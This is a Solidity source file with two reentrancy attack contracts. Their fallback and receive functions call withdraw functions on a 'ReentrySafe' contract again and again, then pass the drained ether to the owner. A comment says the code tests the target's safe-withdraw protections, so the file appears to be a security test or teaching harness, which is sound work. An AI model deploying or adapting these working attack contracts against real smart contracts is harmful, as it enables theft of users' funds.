// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "hardhat/console.sol";
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol';

//test using safeWithdrawUsingEarlyMappingUpdate()
contract ReentryAttack1 is Ownable{
    ReentrySafe public RV;

    constructor(address _ReentrySafe) {
        RV = ReentrySafe(_ReentrySafe);
    }

    fallback() external payable{
        console.log("fallback");
        if (address(RV).balance >= 1 ether) {
            RV.safeWithdrawUsingEarlyMappingUpdate();
        }
    }

    receive() external payable{
        console.log("receive");
        if (address(RV).balance >= 1 ether) {
            RV.safeWithdrawUsingEarlyMappingUpdate();
            
        }
    }

    function attack() external onlyOwner {
        console.log("attack");
        RV.safeWithdrawUsingEarlyMappingUpdate();
    }

    function withdraw() public payable onlyOwner {
        (bool sent, bytes memory data) = owner().call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract ReentryAttack2 is Ownable{
    ReentrySafe public RV;

    constructor(address _ReentrySafe) {
        RV = ReentrySafe(_ReentrySafe);
    }

    fallback() external payable{
        console.log("fallback");
        if (address(RV).balance >= 1 ether) {
            RV.safeWithdrawUsingModifier();
        }
    }

    receive() external payable{
        console.log("receive");
        if (address(RV).balance >= 1 ether) {
            RV.safeWithdrawUsingModifier();
            
        }
    }

    function attack() external onlyOwner {
        console.log("attack");
        RV.safeWithdrawUsingModifier();
    }

    function withdraw() public payable onlyOwner {
        (bool sent, bytes memory data) = owner().call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}